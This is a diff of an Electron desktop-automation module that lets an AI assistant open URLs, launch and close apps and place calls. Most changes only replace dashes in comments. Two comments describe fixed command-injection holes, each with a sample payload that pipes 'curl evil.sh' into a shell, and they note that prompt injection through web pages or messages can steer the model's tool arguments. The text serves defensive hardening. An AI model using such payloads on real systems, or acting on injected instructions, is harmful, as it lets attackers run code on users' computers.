@@ -10,7 +10,7 @@ const IS_MAC   = PLATFORM === 'darwin';
 const IS_LINUX = PLATFORM === 'linux';
 
 // ─── URI SCHEMES (work on all platforms) ─────────────────────────────────────
-// These are handled by the OS — Windows Store, macOS URL handlers, Linux xdg-open
+// These are handled by the OS - Windows Store, macOS URL handlers, Linux xdg-open
 const URI_SCHEMES = {
   whatsapp:          'whatsapp:',
   discord:           'discord:',
@@ -205,7 +205,7 @@ const BROWSER_FALLBACKS = {
 // the shell still expands $(…) and `…` INSIDE double quotes, so a URL such as
 //     https://example.com/$(curl evil.sh|sh)
 // ran the attacker's command. The AI's open_url passes URLs the model wrote,
-// and what the model writes can be steered by a web page or a DM it has read —
+// and what the model writes can be steered by a web page or a DM it has read - 
 // so that was code execution on someone's computer from a message.
 //
 // With execFile and an argument array there is no shell at all: the URL is one
@@ -234,9 +234,9 @@ function getChromeLaunchers(url) {
   ];
 }
 
-// Only web addresses go to a browser. Anything else — file:, javascript:,
+// Only web addresses go to a browser. Anything else - file:, javascript:,
 // ms-msdt: (the "Follina" exploit), search-ms:, or a scheme somebody's
-// installed app registered — is refused here; the few custom schemes the app
+// installed app registered - is refused here; the few custom schemes the app
 // genuinely uses (whatsapp:, spotify: …) go through their own checked path.
 function safeWebUrl(raw) {
   let u;
@@ -256,7 +256,7 @@ function openInChrome(raw) {
     const launchers = getChromeLaunchers(url);
     const tryNext = (idx) => {
       if (idx >= launchers.length) {
-        // No Chrome found. The default browser, via the OS — safe here because
+        // No Chrome found. The default browser, via the OS - safe here because
         // the address was checked above to be http(s) and nothing else.
         shell.openExternal(url).then(() => resolve(true)).catch(() => resolve(false));
         return;
@@ -321,7 +321,7 @@ function launchApp(name) {
       const appName = MAC_APPS[lower];
       exec(`open -a "${appName}"`, (err) => {
         if (!err) { resolve(true); return; }
-        // App might not be installed — try URI scheme
+        // App might not be installed - try URI scheme
         const uri2 = URI_SCHEMES[lower];
         if (uri2) {
           shell.openExternal(uri2).then(() => resolve(true)).catch(() => {
@@ -343,7 +343,7 @@ function launchApp(name) {
       return;
     }
 
-    // 1. Try URI scheme — works cross-platform via the OS default handler —
+    // 1. Try URI scheme - works cross-platform via the OS default handler - 
     //    but only when an app is installed for it; otherwise the website.
     const uri = URI_SCHEMES[lower];
     if (uri && !hasAppFor(uri) && BROWSER_FALLBACKS[lower]) {
@@ -462,7 +462,7 @@ function openFileManager(folderPath) {
 
 // ─── CONTACT LOOKUP ───────────────────────────────────────────────────────────
 function lookupSystemContact(name) {
-  // Strict allowlist — only letters, spaces, hyphens, apostrophes (max 64 chars)
+  // Strict allowlist - only letters, spaces, hyphens, apostrophes (max 64 chars)
   const safeName = (name || '').replace(/[^A-Za-z\s'\-]/g, '').slice(0, 64).trim();
   if (!safeName) return Promise.resolve(null);
   name = safeName; // shadow original with sanitized value
@@ -503,7 +503,7 @@ end tell`;
         resolve((stdout || '').trim() || null);
       });
     } else {
-      // Linux: no standard contacts API — return null
+      // Linux: no standard contacts API - return null
       resolve(null);
     }
   });
@@ -575,13 +575,13 @@ function buildCallUrl(platform) {
 }
 
 // Is an installed app registered for this kind of link (instagram:, whatsapp:)?
-// Windows doesn't fail a link with no app — it offers to find one in the Store —
+// Windows doesn't fail a link with no app - it offers to find one in the Store - 
 // so without this the website fallback never happened.
 function hasAppFor(uri) {
   try {
     const { app } = require('electron');
     return !!app.getApplicationNameForProtocol(`${String(uri).split(':')[0]}://`);
-  } catch (_) { return true; }   // can't tell — try the link as before
+  } catch (_) { return true; }   // can't tell - try the link as before
 }
 
 function openUrl(url, platformFallback) {
@@ -617,7 +617,7 @@ async function makeCall(platform, contactName) {
         viber:    `viber://call?number=${clean}`,
         facetime: `facetime:${clean}`,
         'facetime-audio': `facetime-audio:${clean}`,
-        // tel: is the normal dialler on both platforms — the user's iPhone via
+        // tel: is the normal dialler on both platforms - the user's iPhone via
         // Continuity on a Mac, Phone Link on Windows.
         phone:  `tel:${clean}`,
         mobile: `tel:${clean}`,
@@ -759,7 +759,7 @@ function _walkForFiles(match, limit = 40000) {
       seen++;
       const full = path.join(dir, e.name);
       if (e.isDirectory()) {
-        // The home folder itself is only a starting point — its own subfolders are the roots above.
+        // The home folder itself is only a starting point - its own subfolders are the roots above.
         if (depth < 5 && dir !== home && !_SKIP_DIRS.test(e.name)) queue.push({ dir: full, depth: depth + 1 });
       } else if (match(e.name)) {
         found.push(full);
@@ -829,7 +829,7 @@ function openMusicUri(uri, web) {
       const startedAt = Date.now();
       exec(`osascript -e '${script}'`, (err) => {
         if (!err) {
-          // Hide Spotify so it plays in background — give it 1s to register playback first
+          // Hide Spotify so it plays in background - give it 1s to register playback first
           setTimeout(() => {
             exec(`osascript -e 'tell application "System Events" to set visible of process "Spotify" to false'`, () => {});
           }, 1000);
@@ -860,7 +860,7 @@ function openMusicUri(uri, web) {
       shell.openExternal(uri).then(() => {
         // Windows: spotify:track: URIs load the track in Spotify but don't auto-play.
         // Send WM_APPCOMMAND MEDIA_PLAY (0x319, lParam 3014656) directly to Spotify's
-        // window handle — same as pressing the hardware Play key. No focus needed.
+        // window handle - same as pressing the hardware Play key. No focus needed.
         if (IS_WIN && uri.startsWith('spotify:track:')) {
           const { execFile } = require('child_process');
           // Send WM_APPCOMMAND MEDIA_PLAY to all Spotify windows.
@@ -877,7 +877,7 @@ function openMusicUri(uri, web) {
             `Get-Process spotify -EA SilentlyContinue | ForEach-Object { if ($_.MainWindowHandle -ne 0) { [W]::PostMessage($_.MainWindowHandle, 0x319, [IntPtr]0, [IntPtr]3014656); $sent = $true } }; ` +
             `if (-not $sent) { $h = [W]::FindWindow('Chrome_WidgetWin_0', [NullString]::Value); if ($h -ne 0) { [W]::PostMessage($h, 0x319, [IntPtr]0, [IntPtr]3014656) } }`,
           ], { windowsHide: true, timeout: 8000 }, () => {});
-          // Send at 1.5s, 3s, 5s, 7s — multiple attempts as Spotify registers its window
+          // Send at 1.5s, 3s, 5s, 7s - multiple attempts as Spotify registers its window
           setTimeout(sendPlay, 1500);
           setTimeout(sendPlay, 3000);
           setTimeout(sendPlay, 5000);
@@ -933,7 +933,7 @@ async function run(action, arg) {
     }
 
     case 'open_chat': {
-      // platform|contact|message — the message is typed into the chat, not sent.
+      // platform|contact|message - the message is typed into the chat, not sent.
       const parts = String(arg).split('|');
       await openChat((parts[0] || '').toLowerCase().trim(), (parts[1] || '').trim(), parts.slice(2).join('|').trim());
       return { ok: true };
@@ -1077,7 +1077,7 @@ async function openDocumentFile(name) {
         }
       } catch (_) {}
     }
-    // Office or other file — open with default app
+    // Office or other file - open with default app
     shell.openPath(filePath);
     return { ok: true, type: OFFICE_EXTS.includes(ext) ? ext.slice(1).toUpperCase() : 'file', source: 'local' };
   }
@@ -1214,11 +1214,11 @@ async function switchApp(direction) {
 // Closing. Asks the window to close rather than killing the process, so
 // anything unsaved still gets its chance to say so.
 // The name comes from the AI's close_app tool, so it is whatever the model
-// wrote — and what the model writes can be steered by a web page, a DM or a
+// wrote - and what the model writes can be steered by a web page, a DM or a
 // skill it has read. It is therefore treated as hostile.
 //
 // This used to paste the name into a shell command. On a Mac the AppleScript
-// sat inside single quotes for sh, and only " and \ were removed — so a name
+// sat inside single quotes for sh, and only " and \ were removed - so a name
 // like   x'; curl evil.sh|sh; echo '   closed the quote and ran the
 // attacker's command. Now the name is never part of any code: it is an
 // ARGUMENT to osascript (read inside the script as argv) and an ENVIRONMENT
